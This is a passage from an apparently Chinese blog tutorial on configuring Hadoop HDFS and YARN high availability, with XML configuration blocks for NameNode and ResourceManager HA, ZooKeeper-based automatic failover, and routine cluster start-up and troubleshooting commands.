class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>mycluster<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 集群中 NameNode 节点都有哪些，3之前只能有两个nn --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.ha.namenodes.mycluster<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>nn1,nn2,nn3<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- NameNode 的 RPC 通信地址 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.namenode.rpc-address.mycluster.nn1<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop102:8020<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.namenode.rpc-address.mycluster.nn2<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop103:8020<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.namenode.rpc-address.mycluster.nn3<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop104:8020<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- NameNode 的 http 通信地址 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.namenode.http-address.mycluster.nn1<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop102:9870<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.namenode.http-address.mycluster.nn2<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop103:9870<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.namenode.http-address.mycluster.nn3<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop104:9870<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 指定 NameNode 元数据在 JournalNode 上的存放位置 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.namenode.shared.edits.dir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>qjournal://hadoop102:8485;hadoop103:8485;hadoop104:8485/mycluster<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 访问代理类：client 用于确定哪个 NameNode 为 Active --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.client.failover.proxy.provider.mycluster<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>org.apache.hadoop.hdfs.server.namenode.ha.ConfiguredFailoverProxyProvider<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 配置隔离机制，即同一时刻只能有一台服务器对外响应 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.ha.fencing.methods<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>sshfence<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 使用隔离机制时需要 ssh 秘钥登录--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.ha.fencing.ssh.private-key-files<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>/home/atguigu/.ssh/id_rsa<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>最后分发配置好的 hadoop 环境到其他节点</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 其他节点先创建好目录修改权限</span></span><br><span class="line"><span class="comment"># 来到/opt目录</span></span><br><span class="line">xsync ha/hadoop-3.1.3/</span><br></pre></td></tr></table></figure><h3 id="3-3-启动-HDFS-HA-集群">3.3 启动 HDFS-HA 集群</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将 HADOOP_HOME 环境变量更改到 HA 目录(三台机器)</span></span><br><span class="line">sudo vim /etc/profile.d/my_env.sh</span><br><span class="line"><span class="comment"># 将 HADOOP_HOME 部分改为如下</span></span><br><span class="line"><span class="comment">#HADOOP_HOME</span></span><br><span class="line"><span class="built_in">export</span> HADOOP_HOME=/opt/ha/hadoop-3.1.3</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$HADOOP_HOME</span>/bin</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$HADOOP_HOME</span>/sbin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 刷新</span></span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在各个 JournalNode 节点上，输入以下命令启动 journalnode 服务</span></span><br><span class="line">hdfs --daemon start journalnode</span><br><span class="line">hdfs --daemon start journalnode</span><br><span class="line">hdfs --daemon start journalnode</span><br><span class="line"><span class="comment"># 查看</span></span><br><span class="line">jpsall</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在[nn1]上，对其进行格式化，并启动</span></span><br><span class="line">hdfs namenode -format</span><br><span class="line">hdfs --daemon start namenode</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在[nn2]和[nn3]上，同步 nn1 的元数据信息</span></span><br><span class="line">hdfs namenode -bootstrapStandby</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动[nn2]和[nn3]</span></span><br><span class="line">hdfs --daemon start namenode</span><br><span class="line"><span class="comment"># 打开9870界面，发现都是standby模式</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在所有节点上，启动 datanode</span></span><br><span class="line">hdfs --daemon start datanode</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将[nn1]切换为 Active</span></span><br><span class="line">hdfs haadmin -transitionToActive nn1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看是否 Active</span></span><br><span class="line">hdfs haadmin -getServiceState nn1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 手动模式下需要所有节点都启动才能转换某个节点为active，否则容易脑裂</span></span><br></pre></td></tr></table></figure><h2 id="4、HDFS-HA-自动模式">4、HDFS-HA 自动模式</h2><h3 id="4-1-自动故障转移工作机制">4.1 自动故障转移工作机制</h3><p>自动故障转移为 HDFS 部署增加了两个新组件：ZooKeeper 和 ZKFailoverController（ZKFC）进程，如图所示。ZooKeeper 是维护少量协调数据，通知客户端这些数据的改变和监视客户端故障的高可用服务</p><p><img src="http://qnypic.shawncoding.top/blog/202401251330943.png" alt></p><h3 id="4-2-HDFS-HA-自动故障转移配置">4.2 HDFS-HA 自动故障转移配置</h3><p>首先配置hadoop集群的配置文件，在 hdfs-site.xml 中增加</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 启用 nn 故障自动转移 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.ha.automatic-failover.enabled<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在 core-site.xml 文件中增加</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 指定 zkfc 要连接的 zkServer 地址 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>ha.zookeeper.quorum<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop102:2181,hadoop103:2181,hadoop104:2181<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure><p>修改后分发配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">xsync hadoop/</span><br><span class="line"><span class="comment"># 下一步启动</span></span><br><span class="line"><span class="comment"># 关闭所有 HDFS 服务</span></span><br><span class="line">stop-dfs.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># zookeeper可以参考zookeeper文章，不过搭建也不难</span></span><br><span class="line"><span class="comment"># 启动 Zookeeper 集群,也可以单节点(集群的话三台都要启动，这条命令是脚本)</span></span><br><span class="line">zkServer.sh start</span><br><span class="line"><span class="comment"># 启动 Zookeeper 以后，然后再初始化 HA 在 Zookeeper 中状态</span></span><br><span class="line">hdfs zkfc -formatZK</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动 HDFS 服务</span></span><br><span class="line">start-dfs.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可以去 zkCli.sh 客户端查看 Namenode 选举锁节点内容</span></span><br><span class="line">[zk: localhost:2181(CONNECTED) 7] get -s /hadoop-ha/mycluster/ActiveStandbyElectorLock</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 Active NameNode 进程 kill，查看网页端三台 Namenode 的状态变化</span></span><br><span class="line"><span class="built_in">kill</span> -9 namenode 的进程 id</span><br></pre></td></tr></table></figure><p>如果杀死进程不能切换active的话，可以修改下hdfs.site.xml里面的隔离方法</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.ha.fencing.methods<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">value</span>&gt;</span>sshfence<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">value</span>&gt;</span>shell(true)<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以参考：<a href="https://blog.csdn.net/chanyue123/article/details/108637181" target="_blank" rel="noopener" title="https://blog.csdn.net/chanyue123/article/details/108637181">https://blog.csdn.net/chanyue123/article/details/108637181</a></p><h3 id="4-3-解决-NN-连接不上-JN-的问题">4.3 解决 NN 连接不上 JN 的问题</h3><p>自动故障转移配置好以后，然后使用 <a href="http://start-dfs.sh" target="_blank" rel="noopener">start-dfs.sh</a> 群起脚本启动 hdfs 集群，有可能会遇到 NameNode 起来一会后，进程自动关闭的问题。</p><p>查看报错日志，可分析出报错原因是因为 NameNode 连接不上 JournalNode，而利用 jps 命令查看到三台 JN 都已经正常启动，为什么 NN 还是无法正常连接到 JN 呢？这因为 <a href="http://start-dfs.sh" target="_blank" rel="noopener">start-dfs.sh</a> 群起脚本默认的启动顺序是先启动 NN，再启动 DN，然后再启动 JN，并且默认的 rpc 连接参数是重试次数为 10，每次重试的间隔是 1s，也就是说启动完 NN以后的 10s 中内，JN 还启动不起来，NN 就会报错了</p><p>core-default.xml 里面有两个参数如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- NN 连接 JN 重试次数，默认是 10 次 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">name</span>&gt;</span>ipc.client.connect.max.retries<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">value</span>&gt;</span>10<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 重试时间间隔，默认 1s --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">name</span>&gt;</span>ipc.client.connect.retry.interval<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">value</span>&gt;</span>1000<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure><p>解决方案：遇到上述问题后，可以稍等片刻，等 JN 成功启动后，手动启动下三台，也可以在 core-site.xml 里面适当调大上面的两个参数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hdfs --daemon start namenode</span><br></pre></td></tr></table></figure><h2 id="5、YARN-HA-配置">5、YARN-HA 配置</h2><blockquote><p>官方文档：<a href="https://hadoop.apache.org/docs/r2.7.2/hadoop-yarn/hadoop-yarn-site/ResourceManagerHA.html" target="_blank" rel="noopener" title="https://hadoop.apache.org/docs/r2.7.2/hadoop-yarn/hadoop-yarn-site/ResourceManagerHA.html">https://hadoop.apache.org/docs/r2.7.2/hadoop-yarn/hadoop-yarn-site/ResourceManagerHA.html</a></p></blockquote><h3 id="5-1-环境与核心问题">5.1 环境与核心问题</h3><p><strong>如果当前 active rm 挂了，其他 rm 怎么将其他 standby rm 上位</strong></p><ul><li>核心原理跟 hdfs 一样，利用了 zk 的临时节点</li></ul><p><strong>当前 rm 上有很多的计算程序在等待运行,其他的 rm 怎么将这些程序接手过来接着跑</strong></p><ul><li>rm 会将当前的所有计算程序的状态存储在 zk 中,其他 rm 上位后会去读取，然后接着跑</li></ul><h3 id="5-2-配置-YARN-HA-集群">5.2 配置 YARN-HA 集群</h3><p>配置yarn-site.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.aux-services<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>mapreduce_shuffle<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 启用 resourcemanager ha --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.ha.enabled<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 声明两台 resourcemanager 的地址 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.cluster-id<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>cluster-yarn1<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--指定 resourcemanager 的逻辑列表--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.ha.rm-ids<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>rm1,rm2,rm3<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- ========== rm1 的配置 ========== --&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 指定 rm1 的主机名 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.hostname.rm1<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop102<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 指定 rm1 的 web 端地址 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.webapp.address.rm1<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop102:8088<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 指定 rm1 的内部通信地址 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.address.rm1<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop102:8032<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 指定 AM 向 rm1 申请资源的地址 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.scheduler.address.rm1<span class="tag">&lt;/<span class="name">name</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop102:8030<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 指定供 NM 连接的地址 --&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.resource-tracker.address.rm1<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop102:8031<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- ========== rm2 的配置 ========== --&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 指定 rm2 的主机名 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.hostname.rm2<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop103<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.webapp.address.rm2<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop103:8088<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.address.rm2<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop103:8032<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.scheduler.address.rm2<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop103:8030<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.resource-tracker.address.rm2<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop103:8031<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- ========== rm3 的配置 ========== --&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 指定 rm1 的主机名 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.hostname.rm3<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop104<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 指定 rm1 的 web 端地址 --&gt;</span></span><br><span class="line">  <span 